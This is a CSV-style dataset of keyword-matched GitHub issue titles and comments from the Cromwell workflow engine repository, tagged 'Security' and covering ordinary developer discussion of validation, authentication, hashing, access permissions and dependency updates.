Security,"Right I just meant that in the tests the ratio (DB access / executedCode) may be higher compared to ""normal execution"" where we spend a lot of time waiting for calls to end. But yes production will definitely not be an easier environment than tests :); I kinda like the DataAccess actor option, although I think slick already manages its own pool of threads and everything, so maybe just by tweaking some configuration we could improve performance before going full Super Saiyan Actor Scaling mode.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444:51,access,access,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444,1,['access'],['access']
Security,"Right, the issue is that the name of the output is wrong, so `gvcf` doesn't exist. It would be nice for it to validate before running to tell the user that though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298679419:110,validat,validate,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298679419,1,['validat'],['validate']
Security,Run bare minimum tests on AWS backend until it supports authentication with docker repos [BT-57],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6110:56,authenticat,authentication,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6110,1,['authenticat'],['authentication']
Security,Running and publishing workflows in Cromwell on GCP with GCR images exposes developers to unexpected egress costs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442:68,expose,exposes,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442,1,['expose'],['exposes']
Security,"Running with release 24. As a minimal example, the following WDL:; ```; import ""foo.wdl"" as missing. workflow testMe {; 	call doNothing; }; task doNothing {; 	command {}; }; ```. and a zip file containing `baz.wdl` but not `foo.wdl`:; ```; [conradL@qimr13054 ~]$ unzip -l bar.zip ; Archive: bar.zip; Length Date Time Name; --------- ---------- ----- ----; 0 02-07-2017 13:47 bar/; 0 02-07-2017 13:47 bar/baz.wdl; --------- -------; 0 2 files; ```. submit to server:; ```; [conradL@qimr13054 ~]$ curl http://localhost:8000/api/workflows/V1 -FwdlSource=@badImport.wdl -FwdlDependencies=@bar.zip; {; ""id"": ""b701aafd-445c-4f49-8ba6-452d56e69fd3"",; ""status"": ""Submitted""; }; ```. causes the server process to die with this in the logs:; ```; 2017-02-07 13:52:41,842 cromwell-system-akka.actor.default-dispatcher-33 ERROR - guardian failed, shutting down system; wdl4s.exception.ValidationException: Failed to import workflow foo.wdl.:; File not found /tmp/640585481854205084.zip4511378926145376874/bar/foo.wdl; 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$tryResolve$1(WdlNamespace.scala:198); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:208); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:207); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:873,Validat,ValidationException,873,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['Validat'],['ValidationException']
Security,"RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .cyvcf2 import (VCF, Variant, Writer, r_ as r_unphased, par_relatedness,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/_libs/__init__.py:4: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .tslib import iNaT, NaT, Timestamp, Timedelta, OutOfBoundsDatetime; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/__init__.py:26: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (hashtable as _hashtable,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/dtypes/common.py:6: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/util/hashing.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import hashing, tslib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/base.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, index as libindex, tslib as libts,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/tseries/offsets.py:21: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.tslibs.offsets as liboffsets; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/ops.py:16: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos as libalgos, ops as libops; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:1323,hash,hashing,1323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['hash'],['hashing']
Security,"S, case_gatk_acnv_workflow.TumorWholeGenomeCoverage -> JES, case_gatk_acnv_workflow.NormalCaller -> JES, case_gatk_acnv_workflow.PlotACNVResults -> JES, case_gatk_acnv_workflow.TumorNormalizeSomaticReadCounts -> JES, case_gatk_acnv_workflow.NormalWholeGenomeCoverage -> JES, case_gatk_acnv_workflow.NormalAnnotateTargets -> JES, case_gatk_acnv_workflow.CNLoHAndSplitsCaller -> JES, case_gatk_acnv_workflow.TumorPerformSeg -> JES, case_gatk_acnv_workflow.TumorCaller -> JES, case_gatk_acnv_workflow.AllelicCNV -> JES, case_gatk_acnv_workflow.NormalCorrectGCBias -> JES, case_gatk_acnv_workflow.NormalPerformSeg -> JES, case_gatk_acnv_workflow.NormalNormalizeSomaticReadCounts -> JES, case_gatk_acnv_workflow.PlotSegmentedCopyRatio -> JES, case_gatk_acnv_workflow.TumorCorrectGCBias -> JES, case_gatk_acnv_workflow.HetPulldown -> JES, case_gatk_acnv_workflow.PadTargets -> JES; [2016-10-27 13:10:07,81] [info] JES [6f995b2d]: Creating authentication file for workflow 6f995b2d-cf39-4be1-adfb-b6d0a961bd9c at; gs://my-cromwell-workflows-bucket/case_gatk_acnv_workflow/6f995b2d-cf39-4be1-adfb-b6d0a961bd9c/6f995b2d-cf39-4be1-adfb-b6d0a961bd9c_auth.json; [2016-10-27 13:10:08,17] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:1299,authenticat,authentication,1299,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['authenticat'],['authentication']
Security,"SFS does not have a ""use original path"" AFAIK. It has ""copy"", ""hard-link"" and ""soft-link"".; Those are ""duplication strategies"".; There are also ""hashing strategies"", for file, which can be ""hash file content"" or ""hash file path"". With an optional ""use sibling md5 if it exists"".; I guess the question is, how much of all that do we want to standardize.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306236760:145,hash,hashing,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306236760,3,['hash'],"['hash', 'hashing']"
Security,"Sam is now up and accessible. Complete the wiring process for CromIAM to be able to talk to a live Sam. @cjllanwarne Can you fill in the blanks on what this entails?. (EDIT below by cjllanwarne):. - Have a look at the `handleRequest` method in `SamActor`. It's called by the actor's `receive`.; - Right now, the placeholders complete `Promises` after a set time. You'll want to message SAM, wait for a response, and then complete them more appropriately.; - NB in case you're wondering, the `Promise/Future` stuff is because the CromIamApiService is not an actor and so cannot receive responses in the usual actor-y way. Feel free to make it better, I ended up doing this because the actor-y way was adding in enormous/unnecessary overheads in terms of boilerplate... YMMV.; - FWIW even if `CromIamApiService` isn't an actor, I still suspect `SamActor` will end up spinning up individual worker actors. It's just the interface back to the service which isn't messages.; - The SamActor is parameterized with the `userIdHeader`. SamActorRequests will both have a `userIdtoken` included (oops, `RegisterWorkflow` calls it `user` but it's the same thing). When you make your request to same, you'll need to add the appropriate header (called whatever the actor was parameterized with) with the user token's value.; - Success or Failure completions, everything else *should* be wired up correctly already. You might want to double check that (especially for SAM rejections). If the intrepid person picking up this ticket is not me (@cjllanwarne), I'm happy to make this make more sense in person, if required.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2469:18,access,accessible,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2469,1,['access'],['accessible']
Security,Sanitize LanguageFactory interface,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3239:0,Sanitiz,Sanitize,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3239,1,['Sanitiz'],['Sanitize']
Security,Sanitize PAPI v2 docker usage,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3680:0,Sanitiz,Sanitize,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3680,1,['Sanitiz'],['Sanitize']
Security,Scala-Steward: Update azure-security-keyvault-secrets from 4.3.4 to 4.3.5,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6602:28,secur,security-keyvault-secrets,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6602,1,['secur'],['security-keyvault-secrets']
Security,Scala-Steward: Update azure-security-keyvault-secrets from 4.3.7 to 4.3.8,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6845:28,secur,security-keyvault-secrets,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6845,1,['secur'],['security-keyvault-secrets']
Security,"Scala-Steward: Update logback-access, logback-classic, ... from 1.2.10 to 1.2.11",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6842:30,access,access,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6842,1,['access'],['access']
Security,"Scala-Steward: Update logback-access, logback-classic, ... from 1.2.11 to 1.2.12",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7260:30,access,access,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7260,1,['access'],['access']
Security,"Scala-Steward: Update logback-access, logback-classic, ... from 1.2.11 to 1.4.5",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7026:30,access,access,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7026,1,['access'],['access']
Security,"Scala-Steward: Update logback-access, logback-classic, ... from 1.2.5 to 1.2.6",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6511:30,access,access,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6511,1,['access'],['access']
Security,"Scala-Steward: Update logback-access, logback-classic, ... from 1.2.6 to 1.2.10",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6598:30,access,access,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6598,1,['access'],['access']
Security,See example of a bad WDL which shouldn't validate (since corrected in the WDL so it has to be this hash...) in [ENCODE](https://github.com/ENCODE-DCC/chip-seq-pipeline2/blob/a5cfe39835f9322f770a19f1ff1b777e6111cdb6/chip.wdl#L929-L938),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4621:41,validat,validate,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4621,2,"['hash', 'validat']","['hash', 'validate']"
Security,"See https://github.com/broadinstitute/cromwell/issues/3074 for a description of the problem. This re-uses the values from the cache instead of re-running the job.; The call cache capoeira test was failing in centaur intermittently because a side effect of the issue was that the hashes were not published to metadata, which was failing the test.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3476:279,hash,hashes,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3476,1,['hash'],['hashes']
Security,See user question at: http://gatkforums.broadinstitute.org/wdl/discussion/8015/usage-of-wdl-objects-and-the-read-objects-function#latest. When the user calls read_objects and then correctly (as per the spec) tries to access the value an exception occurs.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1179:217,access,access,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1179,1,['access'],['access']
Security,"Semi :+1: ... I want Scott's various logging things hashed out and I wasn't particularly thorough, trying to balance not delaying you too long, so it'd be good to get another quick pair of eyes or something like that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188441142:52,hash,hashed,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188441142,1,['hash'],['hashed']
Security,"Sending JMUI style call failures to Sentry.; Wired in the ability for Centaur integration tests to get data directly from the Cromwell database.; Added a `queryJobKeyValueEntries` to return all job key/values for a workflow.; Removed deprecation exception for old database config syntax.; Flatten metadata only during comparison, passing the original internally.; Removed secure env variables that were always true in Sentry.; Refactored centaur secure config rendering.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4055:372,secur,secure,372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4055,2,['secur'],['secure']
Security,"Sending error info to sentry during centaur testing before retrying.; Encrypting sensitive variables using a random key during centaur tests, jic they are sent to sentry.; Rendering secure resources during _all_ tests.; When secure variables cannot be rendered, only fail when secure variables are required, otherwise producing only info/warning messages.; Disabled caches during tests that read `backendStatus` call metadata.; Allow `test_cromwell.sh` to use a centaur config file.; Enable GcsPathBuilderFactory to retry more than zero times.; Lazy load centaur `*.inputs` & `*.options` so that they aren't required to load `*.test` files.; Relatedly, so that one doesn't (try to) accidentally commit the changes, `git rm` the options file that was being rendered.; Moved logback.xml out of transitive core library and into executables, next to application.conf files.; Pin `cwltool` version.; Use a workaround to pass `--timeout` through `run_test.sh` to `cwltest`.; Using `better.files` instead of `java.nio.Path`, and passing `IO` monads further up.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4000:70,Encrypt,Encrypting,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4000,4,"['Encrypt', 'secur']","['Encrypting', 'secure']"
Security,Separation of database access into engine and metadata.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2572:23,access,access,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2572,1,['access'],['access']
Security,Set CWL repo git hash to stabilize conformance tests,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3250:17,hash,hash,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3250,1,['hash'],['hash']
Security,Set up KeyVault access [BT-426],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6549:16,access,access,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6549,1,['access'],['access']
Security,Setting the tmpdir to be word accessible poses a security risk at some high-performance compute clusters. Original idea seems to make it world writabled: https://github.com/broadinstitute/cromwell/pull/2053. I would even prefer to set it to be *only* accessable for the `cromwell` user (mod: `700`)... or just leave it as it was provided...,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721:30,access,accessible,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721,3,"['access', 'secur']","['accessable', 'accessible', 'security']"
Security,ShadowWorkflowActor validation Part I : Parse WDL and get WorkflowDescriptor. Closes #648,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/709:20,validat,validation,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/709,1,['validat'],['validation']
Security,Should we confirm the cached-to files are still where they are supposed to be and accessible?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306233790:82,access,accessible,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306233790,1,['access'],['accessible']
Security,Should we just rewrite the hash / equals methods in the Scope trait ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-254944647:27,hash,hash,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-254944647,1,['hash'],['hash']
Security,"Similar to #6324 , but with localization instead of call caching. . The framing of the approach here is:; Make localization of inputs location-aware.; Add a workflow option enabling control of what egress charges can be incurred for input localization.; The new workflow option would be:; localization_egress: [none, continental, global]. where the values affect whether localization of inputs can incur egress charges:; none: only within-region copies are allowed, which generate no egress charges; continental: within content copies are allowed; within-content copies have reduced costs, such as $0.01 / GB in the US; global: copies across all regions are allowed. Cross-content egress charges can be much higher (ranging from $0.08 / GB up to $0.23 / GB). There may also be cases where we have access to get and list objects in the bucket, but can't view the metadata of the bucket. This prevents us from figuring out the location of the bucket. To aid with this, this PR also adds the workflow option:; localization_egress_strict: [true, false] ; If localization_egress_strict is true, then the workflow will fail if we are unable to determine the location of the buckets. ### CURRENT STATUS OF PR:; The idea for this approach is to add an action right before localization, called egressCheck. In this action, we compare the bucket location of each input file with the location of the VM. If we determine there will be egress charge, we will exit appropriately (depending on workflow option).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6332:797,access,access,797,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6332,1,['access'],['access']
Security,"Similar to other parser-related errors reported by Andrea in WB, [via google](https://www.google.com/search?q=owlapi+thread+safety) I'm not convinced the OWL API is thread safe. Some info/debug logging might expose if multiple threads are trying to access the OWL API, and synchronization might fix it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171:208,expose,expose,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171,2,"['access', 'expose']","['access', 'expose']"
Security,"Since it's been a month I thought I'd post an update. Main items:; - In general I'm having to make a lot more changes to the Scala code than I expected due to queries being written in a way that Postgres doesn't like. (This isn't a criticism, more of a heads-up.) Nothing functional, just refactoring.; - The way `Blob` is handled in Slick+Postgres turns out to be a massive pain. I'm not sure if Slick is lazy-loading these fields or I just don't understand how it works under the hood, but the workaround is that the blobs need to be accessed as part of a transaction, which involved some refactoring of downstream processing.; - Semi-related question: is there a reason why the entire contents of the `importsZip` need to be stored in the database? This quickly leads to an enormous METADATA_ENTRY table - possibly because I have call caching turned on, I haven't checked whether this is the cause yet.; - The auto-incremented fields that are `Option[Long]` in the data model can't be handled the same way in Postgres; I haven't decided whether this is simply different database behavior or a bug somewhere. Anyway I found a workaround for that too.; - I may have messed up and branched from `master` in my fork by mistake, and in any case I'm definitely out of sync with your `develop`. Do you have a preferred workflow to bring my branch up to date, i.e. to minimize the mess in the Git history? (Despite using Git daily I'm still not totally sure what ""best practice"" is.). At this point I can at least run a workflow using Postgres, minus call caching. I'm going to be focusing on completing and testing this in the next couple of weeks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402:536,access,accessed,536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402,2,['access'],['accessed']
Security,Since version 32 Womtool validate give this error on wdl file without a workflow: ; `Namespace does not have a local workflow to run`. Is this required by spec? Would be better to still accept this for reusable tasks like this: https://github.com/biowdl/tasks,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762:25,validat,validate,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762,1,['validat'],['validate']
Security,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:391,access,access,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763,1,['access'],['access']
Security,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:263,secur,security,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692,1,['secur'],['security']
Security,"So I tested that this will now correctly fail a workflow, and indeed:; ```; ERROR - WorkflowManagerActor Workflow f587f57a-2897-4450-a4e1-410442f2460c failed (during ExecutingWorkflowState): Variable 'xs' not found; wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'xs' not found; ```. However as noted, this is a Cromwell runtime catch. It'd be much nicer as a WDL4S validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1774#issuecomment-298086885:379,validat,validation,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1774#issuecomment-298086885,1,['validat'],['validation']
Security,"So here is a final update. I have tried running Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Creator (roles/storage.objectCreator); 4. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Viewer (roles/storage.objectViewer). And I have got the following error from Cromwell:; ```; java.lang.Exception: Task xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedP",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:162,access,access-control,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,3,['access'],['access-control']
Security,"So if a a singleton DataAccess can only handle so many connections, could this become a problem when we start scaling ? Or maybe we don't expect that many DB access in real life and the tests are really overstressing it ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143028903:158,access,access,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143028903,1,['access'],['access']
Security,So successes are not wrapped - only failures are (which the ticket was about). With the exception of the validate endpoint which has a special response format which would have been weird not updating.; It's easy enough to wrap the success too - It just feels risky too me to update the entire API responses format a week before firecloud goes live but if that's fine I can wrap the successes too and let them now. We should tell them anyway that the error format will change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379:105,validat,validate,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379,1,['validat'],['validate']
Security,"So, quick thoughts on this. +1 on @delagoya's sidecar container concept (with some concerns I'll mention below). When implementing #3835 I had this issue in mind as well, along with some thoughts on implementation. My thought was to have a sidecar always running, using the [system events](https://docs.docker.com/engine/api/v1.37/#operation/SystemEvents) api to monitor for containers that have exited. At that time, it can [inspect the container](https://docs.docker.com/engine/api/v1.37/#operation/ContainerInspect), make sure it's a cromwell container, and use the volume information (in conjunction with the TASK_ID environment variable I'm setting) to find the local files and copy them out to s3. Something to consider that I don't see discussed yet on this thread: A sidecar approach requires the sidecar to have fairly permissive access to S3. On the positive side, this does alleviate the need for S3 permissions on the container running the task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-401398435:839,access,access,839,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-401398435,1,['access'],['access']
Security,"Solves #488. ; Initial work for Making a centralized validation. Currently, it brings the methods for inputs/options/runtime attr. validation, and uses it for validation via endpoints (like before). Next step will be to make Workflow descriptor a little cleaner, by removing (most) of the validation from there and only instantiate the WorkflowDescriptor once the WDL passes validation (in the WFManagerActor).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/522:53,validat,validation,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/522,5,['validat'],['validation']
Security,"Solves #544. (Might also close #568 #569 #570 ); Intentions: ; 1.) Make the erstwhile `ValidateActor` (now `MaterializeWorkflowDescriptorActor`) central to instantiating the `WorkflowDescriptor` which does so only after all validations succeed. In essence, workflow submissions now go via this route.; 2.) Clean up validation code from `WorkflowDescriptor.scala` (All of that code comes to the above actor); 3.) WorkflowDescriptor should (ideally) be just a case class. Change relevant files where the constructors were being called (quite a lot ~3-liner changes)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/582:87,Validat,ValidateActor,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/582,3,"['Validat', 'validat']","['ValidateActor', 'validation', 'validations']"
